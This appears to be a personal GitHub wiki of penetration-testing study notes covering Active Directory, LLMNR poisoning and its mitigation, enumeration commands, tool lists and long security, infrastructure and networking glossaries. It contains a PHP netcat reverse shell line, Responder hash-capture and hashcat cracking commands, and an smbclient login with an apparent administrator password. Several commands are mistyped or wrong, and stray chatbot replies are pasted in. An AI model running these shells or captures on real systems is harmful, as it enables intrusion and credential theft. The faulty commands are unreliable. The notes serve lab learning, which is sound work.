<!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
<a id="readme-top"></a>


---
# Wiki Home
> [!NOTE]
> Welcome to my wiki

## Windows Active Directory Wiki

Key concepts and architecture of Active Directory.

---

### Active Directory - Group Policy Management

How to configure and manage Group Policies.

## Reg key locations
**Hosts file**
```
c:\Windows\System32\Drivers\etc\hosts
```

---

### Active Directory - Common Issues

Guide to resolving frequently encountered problems.


---

### Active Directory - User Management in Active Directory

Best practices for managing users and groups.

---

### Active Directory - Security and Permissions

Securing your environment and managing permissions.


---

### Active Directory - Backup and Recovery

Preparing for and recovering from disasters.

---

### Active Directory - Active Directory Federation Services (ADFS)


### Active Directory - Active Directory Certificate Services (ADCS)


### Active Directory - Azure AD Integration

### Active Directory Vulnerabilities
#### LLMNR Poisoning - How to attack

Step1️⃣ Run Responder
```
python /usr/share/responder/Responder.py -I tun0 -rdw -v
```
```
sudo -I responder -| tun0 -dwP
```
<details>
<summary>Step 2️⃣</summary>

![image](https://github.com/user-attachments/assets/03f0db35-7e69-4550-9475-c26ea73d9220)

</details>

<details>
<summary>Step 3️⃣A hash will come through, like the screenshot:  </summary>


![image](https://github.com/user-attachments/assets/c3d1f545-3fa3-4e1a-a8ef-d58ff393fd11)

</details>

<details>
<summary>Step 4️⃣ Using hashcat, if the password is weak enough we can crack it:  </summary>


![image](https://github.com/user-attachments/assets/4994fc78-8e58-41dc-a8e3-ba13ae48e118)

```
hashcat -m 5600 hashes.txt rockyou.txt
```
</details>


#### LLMNR Poisoning - Mitigation
---
To mitigate the LLMNR (Link-Local Multicast Name Resolution) poisoning vulnerability in an Active Directory environment, you can use PowerShell to disable LLMNR across your network. Here's how:

<details>
<summary>Steps to Mitigate LLMNR Poisoning</summary>

### Steps:

1. **Check the current status of LLMNR**  
   Use the following PowerShell command to verify whether LLMNR is enabled:
   ```powershell
   Get-NetAdapterBinding -ComponentID ms_lltdio
   ```

   If LLMNR is active, proceed to disable it.

2. **Disable LLMNR via Group Policy**  
   To effectively manage this setting across the network, it is recommended to apply it via Group Policy.

   Use PowerShell to configure the necessary registry settings to disable LLMNR:

   ```powershell
   # Set LLMNR to disabled in the registry
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0
   ```

   If the `EnableMulticast` key doesn't exist, create it:

   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -PropertyType DWord -Value 0
   ```

3. **Confirm the setting**  
   Verify that LLMNR is disabled:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast"
   ```

4. **Deploy via Group Policy** (Optional for multiple machines)  
   - Open the Group Policy Management Console (GPMC).
   - Navigate to `Computer Configuration > Administrative Templates > Network > DNS Client`.
   - Enable the setting **"Turn off multicast name resolution"**.
   ![image](https://github.com/user-attachments/assets/17d6b00b-70d9-4f66-a31a-dccd0553b127)

   Alternatively, use PowerShell to deploy a Group Policy Object (GPO) across your domain:
> [!NOTE]
> Add the link to the powershell document.
   ```powershell
   # Create a new GPO
   New-GPO -Name "Disable LLMNR"
   
   # Configure the GPO to disable LLMNR
   Set-GPRegistryValue -Name "Disable LLMNR" -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -ValueName "EnableMulticast" -Type DWord -Value 0

   # Link GPO to a specific Organizational Unit (OU)
   New-GPLink -Name "Disable LLMNR" -Target <e.g.>"OU=<<<Computers>>>,DC=<<<YourDomain>>>,DC=co,DC=uk"
   ```

5. **Test and Validate**  
   After applying the changes, test to ensure that LLMNR is disabled and that no LLMNR traffic is observed. You can use a network monitoring tool like Wireshark to confirm that LLMNR queries (port 5355) are no longer broadcasted.

   **Deploy via Group Policy** (Optional for multiple machines)  
   - Open the Group Policy Management Console (GPMC).
   - Navigate to `Computer Configuration > Administrative Templates > Network > DNS Client`.
   - Enable the setting **"Turn off multicast name resolution"**.
   ![image](https://github.com/user-attachments/assets/17d6b00b-70d9-4f66-a31a-dccd0553b127)

</details>

By disabling LLMNR, you effectively reduce the risk of exploitation via LLMNR poisoning attacks in your Active Directory environment.
> [!TIP]
> If a company must use or cannot disable LLMNR, the best course of action is to:
>
> 1️⃣Require Network Access Control
> 
> 2️⃣Require Strong user passwords (greater than 14 characters)

### SMB Relay Vulnerabilities

### Gaining Shell Access Vulnerabilities

### IPv6 Vulnerabilities

### Passback Attacks

### Pass Attacks

### Kerberoasting

### Token Impersonation

### LNK File Attacks

### GPP/cPassword Attacks

### Mimikatz

### Golden Ticket Attacks

### ZeroLogon Attacks

### PrintNightmare (CVE-2021-1675)

### Active Directory Case Studies

### Domain Enumeration Tools
> [!NOTE]
> ldapdomaindump
>
> Bloodhound
> 
> Plumhound
>
> PingCastle


# **Penetration Testing Wiki**

## **Introduction to Penetration Testing**
- Overview of Penetration Testing
  - Definition and Goals
  - Types of Penetration Tests (Black Box, White Box, Gray Box)
- Legal and Ethical Considerations
  - Laws and Compliance (e.g., GDPR, HIPAA, PCI-DSS)
  - Rules of Engagement (ROE)
  - Obtaining Permission (Authorization)

---

## **The Penetration Testing Lifecycle**
- Planning and Pre-Engagement
  - Scoping and Requirements
  - Threat Modeling
  - Attack Surface Analysis
- Reconnaissance
  - Passive Reconnaissance
  - Active Reconnaissance
  - OSINT Tools and Techniques
- Scanning and Enumeration
  - Network Mapping
  - Service Enumeration
  - Vulnerability Scanning
- Exploitation
  - Gaining Access
  - Privilege Escalation
  - Tools for Exploitation
- Post-Exploitation
  - Persistence
  - Lateral Movement
  - Data Exfiltration
- Reporting
  - Writing a Professional Report
  - Mitigation Recommendations

---

## **Reconnaissance Tools and Techniques**
- OSINT Tools
  - Maltego
  - theHarvester
  - SpiderFoot
  - Shodan
- Subdomain Enumeration
  - Amass
  - Sublist3r
- Google Dorking
  - Advanced Search Operators
- WHOIS and DNS Recon
  - dnsenum
  - DNSRecon

---

## **Scanning and Enumeration**
### Active Directory Enumeration

```
whoami /priv
```
- Network Scanning
  - Nmap
  - Masscan
- Web Application Scanning
  - Nikto
  - Burp Suite
- Service Enumeration
  - smbclient
  - enum4linux
  - rpcclient

### AV Enumeration
> [!NOTE]
> To query Windows Defender, use:
```
sc query windefend
```
> [!NOTE]
> To find out what AV is running, use:
```
sc queryex type= service
```
### Firewall Enumeration
> [!NOTE]
> To query the firewalls, use
```
netsh advfirewall firewall dump
```
```
netsh firewall show state
```
```
netsh firewall show config
```
---

## **5. Exploitation**
- Exploitation Frameworks
  - Metasploit
  - Cobalt Strike
  - Core Impact
- Vulnerability-Specific Exploits
  - SQLmap (SQL Injection)
  - Hydra (Brute Forcing)
  - Aircrack-ng (Wi-Fi Hacking)
- Scripting Exploits
  - Python and Bash Exploits
  - Custom Scripts for Exploitation

---

## **Post-Exploitation**
- Privilege Escalation
  - Windows Tools: WinPEAS, Mimikatz, PowerUp
  - Linux Tools: LinPEAS, GTFOBins
- Persistence Mechanisms
  - Scheduled Tasks
  - Startup Scripts
- Lateral Movement
  - PsExec
  - BloodHound
- Data Exfiltration
  - Netcat
  - Exfiltration Over DNS

---

## **Web Application Security**
- OWASP Top 10
- Common Web Vulnerabilities
  - SQL Injection
  - Cross-Site Scripting (XSS)
  - Cross-Site Request Forgery (CSRF)
  - Insecure Deserialization
- Web Security Tools
  - Burp Suite
  - OWASP ZAP
  - Wappalyzer

---

## **Wireless Penetration Testing**
- Wireless Attacks
  - WPA/WPA2 Cracking
  - Evil Twin Attacks
- Wireless Tools
  - Aircrack-ng Suite
  - Wireshark
  - Bettercap

---

## **Social Engineering**
- Techniques
  - Phishing
  - Vishing
  - Pretexting
- Tools
  - Gophish
  - SET (Social Engineering Toolkit)

---

## **Reporting and Documentation**
- Reporting Structure
  - Executive Summary
  - Technical Details
  - Proof of Concepts
- Risk Ratings
  - CVSS (Common Vulnerability Scoring System)
- Mitigation Strategies
  - Best Practices for Hardening

---
## **Vulnerabilities & Exploits**
- Windows Subsystem for Linux (WSL)
  - PayloadsAllTheThings

### Hackthebox machines
- [ ] Chatterbox
- [ ] SecNotes

## **Tools Cheat Sheet #cheatsheet**
- Reconnaissance Tools
  - theHarvester, Shodan, SpiderFoot
- Scanning Tools
  - Nmap, Nikto, Masscan
- Exploitation Tools
  - Metasploit, SQLmap, Hydra
- Post-Exploitation Tools
  - Mimikatz, LinPEAS, BloodHound
- Reporting Tools
  - Dradis Framework
### Exploiting SMB
```
smbclient -U 'administrator%u6!4zwgwOM#^0Bf#Nwhn' \\\\127..0.1\\c$
```

### Exploiting PHP
This is a basic reverse shell written in php 
```
<?php
system('nc.exe -e cmd.exe $yourip 4444')
?>
```
### Exploiting with exec tools
- psexpec.py
- smbexec.py
- wmiexec.py

### Exploiting with Shells
Spawning a TTY Shell - https://netsec.ws/?p=337

### impacket
https://github.com/SecureAuthCorp/impacket.git
```
cd /opt/
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket-0.9.19/
pip3 install.
```
> [!NOTE]
> The version number may change under the git clone line



### netcat and nmap
[Kioptrix Download](https://tcm-sec.com/kioptrix)

Nmap
```
arp-scan
```
SYN SYNACK ACK nmap
Stealth scanning
SYN SYNACK ACK nmap -sS
SYN SYNACK RST nmap -sS

```
nmap -T4 -P- -A
```
### OSINT & Recon Resources | Intelligence Lifecycle
![image](https://github.com/user-attachments/assets/f3dcb343-e338-470e-ae98-d0b64fb11196)
https://blog.reknowledge.tech/blog/osnt-analyst-replaced-by-automation
PLANNING & DIRECTION >> COLLECTION >> PROCESSING AND EXPLOITATION >> ANALYSIS AND PRODUCTION >> DISSEMINATON AND INTEGRATION

### OSINT & Recon Resources | Google Fu
* Google, lmgtfy,
* site:<domain>
* site:tesla.com -www
* filetype:csv

### OSINT & Recon Resources | email addresses
* hunter.io
* Phonebook.cz
* Clearbit
* email-checker.net
* emailhippo.com

### OSINT & Recon Resources | hashes
* hashes.org

### OSINT & Recon Resources | hunting subdomains and website technologies
* sublist3r
* owasp amass
  
* wappalyzer (Firefox)
* burpsuite [https://burp](https://burp) - Kali
* 

### github
[hmaverickadams | breach-parse | github.com](https://github.com/hmaverickadams/breach-parse)



---

## **Resources #resources**
- Recommended Courses
  - TCM Academy (PNPT, OSINT, Practical Ethical Hacking)
- Practice Labs
  - TryHackMe
  - Hack The Box
  - VulnHub
- Books
  - "The Hacker Playbook"
  - "Red Team Field Manual"
  - "Metasploit: The Penetration Tester’s Guide"
- https://github.com/swisskyrepo/PayloadsAllTheThings

**Links to further reading and tools.**

- [Microsoft Documentation](resources#microsoft-documentation)
- [PowerShell Modules](resources#powershell-modules)
- [Useful Tools for IT Admins](resources#useful-tools)
---

# FAQ

Answers to commonly asked questions.

- [What happens if a DC goes offline?](faq#dc-offline)
- [How to fix Group Policy not applying?](faq#group-policy-fix)

---



---
# Dictionary Home
---
> [!NOTE]
> Dictionaries / lists of terms starts here.
# Penetration Testing Dictionary

<p align="left">(<a href="#readme-top">back to top</a>)</p>

## Active Directory Vulnerability Dictionary
> [!NOTE]
> **LLMNR (Link-Local Multicast Name Resolution)**
>
> A protocol for resolving hostnames to IP addresses within a local network without requiring a DNS server.

> [!NOTE]
> **SMB Relay**
>
>  Instead of cracking passwords, we can intercept the hashes and send those on (relay them) to other machines and potentially gain access

> [!NOTE]
> **Gaining Shell Access**
>
>  Exploiting features in order to control the victim machine remotely, with a command line tool

> [!NOTE]
> **IPv6 Attacks**
>
>  Attacks against the IPv6 network protocol which is enabled by default on Windows server devices.

> [!NOTE]
> **Passback Attacks**
>
>  TBC

## PenTesting | Tools

### Active Directory
AD Components
* Domain Controllers
* AD DS Data Store
* NTDS.dit
* Forests
  Trees, Trusts,
* Trusts: Directional, Transitive
* Organisational Units (OUs)
* Schema

* Class Objects
* Attribute Objects

#### AD Objects:
User Objects: enable network resource access for a user

InetOrgPerson: Simlar to a user account, used for compatibility with other directory services

Contacts: Used primarily to assign e-mail addresses to external users, Does not enable network access

Groups: Used to simplify the administration of access control

Computers: Enables auth and auditing of computer access to resources

Printers: Used to simplify the process of locating an connecting to printers

Shared folders: Enables users to search for shared folders based on properties

Certificates: A certificate on a server is like an ID card for a website. It shows that the website is legitimate and helps ensure that your information is safe when you visit it.
When you go to a website, this certificate lets your browser know that it’s talking to the real site and not an imposter. It also helps to encrypt any data you share, like passwords or credit card numbers, so that only the website can read it. In short, it’s a way to build trust and keep your online activities secure.
![image](https://github.com/user-attachments/assets/395a225c-48a7-4bc1-b659-5f2b8a6efc9e)

credit: [https://www.beyondtrust.com/blog/entry/esc1-attacks](https://www.beyondtrust.com/blog/entry/esc1-attacks)

#### AD CS (Active Directory Certificate Services
Key functions of AD CS
* Integration with Active Directory: AD CS integrates with Microsoft’s PKI implementation within Active Directory to facilitate the issuance of certificates for X.509-formatted documents, encryption, message signing, and authentication.
* Certificate Authority (CA): Certificates are issued by Certificate Authority (CA). CAs bind an identity to a public/private key pair, which is then utilized by applications to verify user identity.
* Private/Public Key Generation: The client generates a private key pair. The public key is included in a Certificate Signing Request (CSR) along with details like subject and template name.
* Certificate Signing Request (CSR): The CSR, which includes the public key and other details necessary for certificate generation, is sent to the Enterprise CA server.
Verification by CA Server: The Enterprise CA server verifies the client’s permissions and template settings. It ensures the client is permitted to request the certificate based on the provided template settings.
* Certificate Generation: If the client’s request is permitted, the CA generates a certificate based on the template settings. The certificate is signed with the CA’s private key.
* Certificate Issuance: The signed certificate is returned to the client, who can now use the certificate for secure communications, authentication, and other cryptographic operations.
* object identifiers (OIDs) [PKI Solutions provides a comprehensive list of the EKU OIDs offered by Microsoft](https://www.pkisolutions.com/object-identifiers-oid-in-pki/).
* ESC1 attacks: and [Read on ESC1 attacks](https://www.beyondtrust.com/blog/entry/esc1-attacks) and Certipy: [certipy tool](https://github.com/ly4k/Certipy)

#### Build a lab in Azure
[Build a lab in Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)



## other courses
* OSINT Fundamentals

## 5 stages of ethical hacking - diagram
![image](https://github.com/user-attachments/assets/1d12b895-29e8-475c-bce1-2ce10e282ff1)

## Penetration Testing (Pentesting)

> [!NOTE]
> A simulated cyberattack against a system to identify vulnerabilities.

Here is the content with the headings (`##`) alphabetized, while keeping the original format:

---

## Advanced Persistent Threat (APT)
> [!NOTE]
> A prolonged and targeted cyberattack in which an intruder gains access to a network and remains undetected.

## Aircrack-ng
> [!NOTE]
> A suite of tools for assessing Wi-Fi network security.

## ARP Spoofing
> [!NOTE]
> A technique where an attacker sends falsified ARP messages over a local network.

## Attack Surface
> [!NOTE]
> The total sum of the vulnerabilities that can be exploited in a system.

## Backdoor
> [!NOTE]
> A secret method of bypassing normal authentication to gain access to a system.

## Blue Team
> [!NOTE]
> The defenders who protect the organization's assets and respond to attacks.

## Botnet
> [!NOTE]
> A network of compromised devices controlled by an attacker.

## Brute Force Attack
> [!NOTE]
> Attempting to gain access by trying all possible combinations of credentials.

## Buffer Overflow
> [!NOTE]
> Overwriting a program's memory, leading to arbitrary code execution.

## Bug Bounty Program
> [!NOTE]
> A program that rewards individuals for finding and reporting vulnerabilities.

## Burp Suite
> [!NOTE]
> A popular tool for web application security testing.

## Clickjacking
> [!NOTE]
> A technique used to trick users into clicking on something different from what they perceive.

## Command and Control (C2)
> [!NOTE]
> Servers that attackers use to communicate with compromised systems.

## Credential Harvesting
> [!NOTE]
> Collecting credentials from users by tricking them into entering them into a fake website or form.

## Credential Stuffing
> [!NOTE]
> Using leaked username/password pairs from one breach to access other sites.

## Cross-Site Request Forgery (CSRF)
> [!NOTE]
> An attack that tricks a user into performing actions on a web application without their consent.

## Cross-Site Scripting (XSS)
> [!NOTE]
> Injecting malicious scripts into web pages viewed by other users.

## Data Exfiltration
> [!NOTE]
> The unauthorized transfer of data from a computer or other device.

## Denial of Service (DoS) Attack
> [!NOTE]
> An attack designed to make a system unavailable by overwhelming it with traffic.

## Dictionary Attack
> [!NOTE]
> A type of brute force attack that uses a list of common passwords or words.

## Distributed Denial of Service (DDoS) Attack
> [!NOTE]
> A DoS attack using multiple systems to flood the target.

## DNS Spoofing
> [!NOTE]
> An attack where false DNS information is inserted into a DNS resolver's cache.

## Drive-by Download
> [!NOTE]
> The unintentional download of malicious software to a user’s device.

## Eavesdropping
> [!NOTE]
> Secretly listening to private communications.

## Enumeration
> [!NOTE]
> Extracting user names, machine names, network resources, and other services.

## Exploit
> [!NOTE]
> A code or software that takes advantage of a vulnerability.

## Firewall
> [!NOTE]
> A network security device that monitors and filters incoming and outgoing network traffic.

## Footprinting
> [!NOTE]
> Collecting data on a target system or network to map out its structure.

## Forensics
> [!NOTE]
> The process of collecting, analyzing, and preserving digital evidence.

## Full Disk Encryption (FDE)
> [!NOTE]
> Encryption that covers all the data on a disk.

## Fuzzing
> [!NOTE]
> A testing technique that involves inputting random data to find vulnerabilities.

## Honey Net
> [!NOTE]
> A network of honeypots that simulate a network to lure attackers.

## Honey Pot
> [!NOTE]
> A decoy system set up to attract and detect attackers.

## Hydra
> [!NOTE]
> A fast and flexible password-cracking tool.

## Incident Response
> [!NOTE]
> The approach taken by an organization to handle a security breach or attack.

## Insider Threat
> [!NOTE]
> A security risk that comes from within the organization, typically from employees or contractors.

## Intrusion Detection System (IDS)
> [!NOTE]
> A device or software application that monitors network traffic for suspicious activity.

## Intrusion Prevention System (IPS)
> [!NOTE]
> Similar to IDS but actively prevents detected threats.

## John the Ripper
> [!NOTE]
> A password-cracking tool.

## Keylogging
> [!NOTE]
> Recording the keystrokes of a user to capture sensitive information.

## Kill Chain
> [!NOTE]
> A model used to describe the stages of a cyberattack, from reconnaissance to exfiltration.

## Malware
> [!NOTE]
> Malicious software designed to disrupt, damage, or gain unauthorized access to a system.

## Malvertising
> [!NOTE]
> The use of online advertising to spread malware.

## Man-in-the-Middle (MitM) Attack
> [!NOTE]
> Intercepting and possibly altering communication between two parties.

## Metasploit
> [!NOTE]
> A popular penetration testing framework used to develop and execute exploit code.

## Network Sniffing
> [!NOTE]
> Capturing and analyzing network packets to detect and troubleshoot issues.

## Nikto
> [!NOTE]
> A web server scanner that tests for vulnerabilities.

## Nmap
> [!NOTE]
> A network scanning tool used to discover hosts and services on a network.

## Obfuscation
> [!NOTE]
> The act of making something unclear or unintelligible to obscure its meaning.

## Open Web Application Security Project (OWASP)
> [!NOTE]
> An organization that provides resources to improve software security.

## OWASP Top Ten
> [!NOTE]
> A list of the most critical security risks to web applications.

## OWASP ZAP (Zed Attack Proxy)
> [!NOTE]
> An open-source web application security scanner.

## Patch Management
> [!NOTE]
> The process of regularly updating software to fix vulnerabilities.

## Patch Tuesday
> [!NOTE]
> The second Tuesday of each month when Microsoft releases security updates.

## Payload
> [!NOTE]
> The part of an exploit that performs the intended malicious action.

## Penetration Testing Execution Standard (PTES)
> [!NOTE]
> A standard framework for conducting penetration tests.

## Phishing
> [!NOTE]
> A method of tricking individuals into providing sensitive information by pretending to be a trustworthy entity.

## Pivoting
> [!NOTE]
> Using a compromised system as a launch point to attack other systems on the same network.

## Port Scanning
> [!NOTE]
> A technique used to identify open ports and services on a networked device.

## Privilege Escalation
> [!NOTE]
> Gaining higher-level permissions on a system.

## Purple Team
> [!NOTE]
> A combination of Red and Blue Teams that collaborate to improve overall security.

## Ransomware
> [!NOTE]
> Malware that encrypts files on a device, demanding a ransom for decryption.

## Reconnaissance
> [!NOTE]
> The process of gathering information about a target.

## Red Team
> [!NOTE]
> A group of ethical hackers who simulate attacks to test the security of an organization.

## Red Teaming
> [!NOTE]
> A more comprehensive testing strategy that involves simulating real-world attacks over an extended period.

## Reverse Shell
> [!NOTE]
> A shell session initiated by the target machine to the attacker’s machine.

## Risk Assessment
> [!NOTE]
> The process of identifying, analyzing, and evaluating risks.

## Rogue Access Point
> [!NOTE]
> A wireless access point that has been installed on a network without authorization.

## Rootkit
> [!NOTE]
> A set of software tools that enable unauthorized access to a computer, often remaining hidden.

## Sandboxing
> [!NOTE]
> Running programs in isolated environments to prevent them from affecting the main system.

## Scanning
> [!NOTE]
> Actively probing a target to gather information about its network and systems.

## Security Information and Event Management (SIEM)
> [!NOTE]
> A solution that provides real-time analysis of security alerts generated by network hardware and applications.

## Security Operations Center (SOC)
> [!NOTE]
> A centralized unit that deals with security issues at the organizational level.

## Security Orchestration, Automation, and Response (SOAR)
> [!NOTE]
> Tools that automate the response to security incidents.

## Security Posture
> [!NOTE]
> The overall security status of an organization's systems, networks, and information.

## Session Hijacking
> [!NOTE]
> An attack that involves taking over a user session to gain unauthorized access.

## Shell
> [!NOTE]
> A command-line interface that allows users to interact with the operating system.

## Sock Puppets
> [!NOTE]
> Online identities that are not a representation of who someone is - e.g. a fake identity, fake accounts. These are used to avoid someone noticing you are investigating them

## Spear Phishing
> [!NOTE]
> A targeted phishing attack aimed at a specific individual or organization.

## SQL Injection (SQLi)
> [!NOTE]
> An attack that allows execution of malicious SQL statements on a database.

## SQLmap
> [!NOTE]
> An automated tool for detecting and exploiting SQL injection flaws.

## SSL/TLS
> [!NOTE]
> Protocols for encrypting data transmitted over a network.

## Steganography
> [!NOTE]
> The practice of hiding data within other non-secret data.

## Supply Chain Attack
> [!NOTE]
> Attacking an organization by targeting less-secure elements in its supply chain.

## Threat Hunting
> [!NOTE]
> The process of proactively searching for cyber threats that are lurking undetected in a network.

## Threat Intelligence
> [!NOTE]
> Information that helps organizations understand and mitigate cyber threats.

## Threat Modeling
> [!NOTE]
> The process of identifying and prioritizing potential threats to a system.

## Time-based One-Time Password (TOTP)
> [!NOTE]
> A temporary passcode generated by an algorithm that uses the current time as one of its factors.

## Trojan Horse
> [!NOTE]
> Malicious software disguised as legitimate software.

## Two-Factor Authentication (2FA)
> [!NOTE]
> A security process that requires two separate forms of identification.

## Virus
> [!NOTE]
> A type of malware that replicates by modifying other programs and inserting its code.

## Virtual Machine Escape
> [!NOTE]
> An attack that allows an attacker to escape the confines of a virtual machine and interact with the host operating system.

## VPN (Virtual Private Network)
> [!NOTE]
> A secure connection over a less-secure network, like the internet.

## Vulnerability
> [!NOTE]
> A weakness in a system that can be exploited by a threat actor.

## Watering Hole Attack
> [!NOTE]
> An attack strategy where the attacker infects websites likely to be visited by a specific group of individuals.

## Windows Privilege Escalation  
> [!NOTE]  
> The process of exploiting vulnerabilities or misconfigurations in a Windows system to gain higher levels of access or permissions.  

## Wireshark
> [!NOTE]
> A network protocol analyzer used to capture and analyze network traffic.

## Worm
> [!NOTE]
> A type of malware that replicates itself in order to spread to other computers.

## Zero-Day
> [!NOTE]
> A vulnerability that is unknown to the software vendor and for which no patch exists.

---

Let me know if further changes are needed!

Here is the formatted list with the top 100 terms for Infrastructure, Networking, and Cloud Engineering:

# Infrastructure Dictionary
<p align="left">(<a href="#readme-top">back to top</a>)</p>
## Infrastructure as Code (IaC)
> [!NOTE]
> The practice of managing and provisioning computing infrastructure through machine-readable definition files, rather than physical hardware configuration.

## Virtualization
> [!NOTE]
> The creation of virtual versions of physical components, such as servers, storage devices, and network resources.

## Hypervisor
> [!NOTE]
> Software that creates and runs virtual machines (VMs) by abstracting the underlying hardware.

## Containerization
> [!NOTE]
> The process of packaging an application and its dependencies into a container that can run on any computing environment.

## Bare Metal
> [!NOTE]
> Physical servers without any virtualization, where the operating system runs directly on the hardware.

## Load Balancer
> [!NOTE]
> A device or software that distributes network or application traffic across multiple servers to ensure availability and reliability.

## Data Center
> [!NOTE]
> A facility used to house computer systems and associated components, such as telecommunications and storage systems.

## High Availability (HA)
> [!NOTE]
> A system design approach and associated service implementation that ensures a certain level of operational performance, typically uptime, for a higher than normal period.

## Disaster Recovery (DR)
> [!NOTE]
> A set of policies and procedures to enable the recovery or continuation of vital technology infrastructure after a natural or human-induced disaster.

## Scalability
> [!NOTE]
> The ability of a system to handle growing amounts of work by adding resources to the system.

## Redundancy
> [!NOTE]
> The duplication of critical components or functions of a system to increase reliability and availability.

## Fault Tolerance
> [!NOTE]
> The ability of a system to continue functioning when part of the system fails.

## Colocation
> [!NOTE]
> A data center facility where businesses can rent space for servers and other computing hardware.

## On-Premises
> [!NOTE]
> Infrastructure that is hosted within the physical confines of an organization’s facilities.

## Cloud Computing
> [!NOTE]
> The delivery of computing services—including servers, storage, databases, networking, software—over the cloud (internet).

## Edge Computing
> [!NOTE]
> The practice of processing data near the edge of the network, where the data is being generated, rather than in a centralized data-processing warehouse.

## Rack Unit (RU)
> [!NOTE]
> A unit of measure defined as 1.75 inches, used to describe the height of equipment in a rack.

## Service Level Agreement (SLA)
> [!NOTE]
> A contract between a service provider and a customer that outlines the level of service expected during its term.

## Virtual Private Server (VPS)
> [!NOTE]
> A virtual machine sold as a service by an Internet hosting service.

## Backup
> [!NOTE]
> The process of copying and archiving computer data so it may be used to restore the original after a data loss event.

## Storage Area Network (SAN)
> [!NOTE]
> A network that provides access to consolidated, block-level data storage.

## Network-Attached Storage (NAS)
> [!NOTE]
> A dedicated file storage device that provides local area network (LAN) nodes with file-based shared storage through a standard Ethernet connection.

## RAID (Redundant Array of Independent Disks)
> [!NOTE]
> A data storage virtualization technology that combines multiple physical disk drive components into one or more logical units for data redundancy and performance improvement.

## Blade Server
> [!NOTE]
> A modular server that fits into a chassis with other blade servers, sharing power and cooling resources.

## UPS (Uninterruptible Power Supply)
> [!NOTE]
> A device that provides emergency power to a load when the input power source or mains power fails.

## Network Operations Center (NOC)
> [!NOTE]
> A centralized location from which IT professionals monitor, manage, and maintain network infrastructure.

## DevOps
> [!NOTE]
> A set of practices that combine software development (Dev) and IT operations (Ops) to shorten the systems development lifecycle.

## Monitoring
> [!NOTE]
> The process of observing and checking the progress or quality of a system over time.

## Logging
> [!NOTE]
> The act of keeping a log of events, errors, and other operational details in software or hardware systems.

## Configuration Management
> [!NOTE]
> The process of maintaining computer systems, servers, and software in a desired, consistent state.

## Patch Management
> [!NOTE]
> The process of managing a network of computers by regularly performing patch deployment to ensure systems are up-to-date and protected from vulnerabilities.

## Orchestration
> [!NOTE]
> The automated configuration, management, and coordination of computer systems, applications, and services.

## Serverless
> [!NOTE]
> A cloud-computing execution model where the cloud provider dynamically manages the allocation and provisioning of servers.

## Scripting
> [!NOTE]
> Writing scripts to automate repetitive tasks in infrastructure and system management.

## Virtual Network Function (VNF)
> [!NOTE]
> A software implementation of a network function that can be deployed on a virtualized infrastructure.

## Container Orchestration
> [!NOTE]
> The automated process of managing the lifecycle of containers, especially in large, dynamic environments.

## Infrastructure Monitoring
> [!NOTE]
> The practice of collecting and analyzing data to ensure that infrastructure performs at its best and meets the needs of users.

## Hybrid Cloud
> [!NOTE]
> A computing environment that combines on-premises infrastructure, private cloud services, and a public cloud.

## Private Cloud
> [!NOTE]
> A cloud computing model where the cloud infrastructure is dedicated to a single organization.

## Public Cloud
> [!NOTE]
> A cloud computing model where the cloud infrastructure is owned and operated by a third-party cloud service provider, and resources are shared among multiple organizations.

## Kubernetes
> [!NOTE]
> An open-source container orchestration platform that automates the deployment, scaling, and operation of application containers.

## Docker
> [!NOTE]
> A platform used to develop, ship, and run applications inside containers.

## OpenStack
> [!NOTE]
> An open-source cloud computing platform for building and managing public and private clouds.

## Terraform
> [!NOTE]
> An open-source infrastructure as code software tool that enables users to define and provision data center infrastructure using a high-level configuration language.

## Ansible
> [!NOTE]
> An open-source automation tool for configuration management, application deployment, and task automation.

## Puppet
> [!NOTE]
> An open-source software configuration management tool that automates the management of infrastructure.

## Chef
> [!NOTE]
> An open-source automation platform that transforms infrastructure into code, enabling operations and development teams to manage environments.

## Jenkins
> [!NOTE]
> An open-source automation server used to automate parts of software development, such as building, testing, and deploying code.

## Continuous Integration (CI)
> [!NOTE]
> A development practice where developers integrate code into a shared repository frequently, with each integration automatically verified by a build.

## Continuous Deployment (CD)
> [!NOTE]
> A software release process where code changes are automatically deployed to production after passing predefined tests.

## Continuous Delivery
> [!NOTE]
> A software development practice where code changes are automatically prepared for a release to production.

## Site Reliability Engineering (SRE)
> [!NOTE]
> A discipline that applies aspects of software engineering to infrastructure and operations problems to create scalable and highly reliable software systems.

# Networking Dictionary
<p align="left">(<a href="#readme-top">back to top</a>)</p>
## IP Address
> [!NOTE]
> A unique string of numbers separated by periods or colons that identifies each computer using the Internet Protocol to communicate over a network.

## Subnetting
> [!NOTE]
> The practice of dividing a network into smaller, more efficient subnetworks.

## DNS (Domain Name System)
> [!NOTE]
> The phonebook of the internet, translating domain names into IP addresses so browsers can load resources.

## DHCP (Dynamic Host Configuration Protocol)
> [!NOTE]
> A network management protocol that dynamically assigns IP addresses to devices on a network.

## Router
> [!NOTE]
> A device that forwards data packets between computer networks.

## Switch
> [!NOTE]
> A device that connects devices on a computer network by using packet switching to receive, process, and forward data to the destination device.

## Firewall
> [!NOTE]
> A network security device that monitors and filters incoming and outgoing network traffic based on an organization’s previously established security policies.

## VLAN (Virtual LAN)
> [!NOTE]
> A subnetwork that can group together a collection of devices from different physical LANs.

## NAT (Network Address Translation)
> [!NOTE]
> A method of remapping one IP address space into another by modifying network address information in the IP header of packets while they are in transit across a traffic routing device.

## VPN (Virtual Private Network)
> [!NOTE]
> A service that allows you to connect to the internet securely and privately by routing your connection through a server and hiding your online actions.

## MAC Address
> [!NOTE]
> A unique identifier assigned to a network interface controller for communications at the data link layer of a network segment.

## OSI Model
> [!NOTE]
> A conceptual framework used to describe the functions of a networking or telecommunication system in seven layers.

## TCP/IP
> [!NOTE]
> The suite of communication protocols used to connect network devices on the internet.

## Bandwidth
> [!NOTE]
> The maximum rate of data transfer across a given path.

## Latency
> [!NOTE]
> The delay before

 a transfer of data begins following an instruction for its transfer.

## Throughput
> [!NOTE]
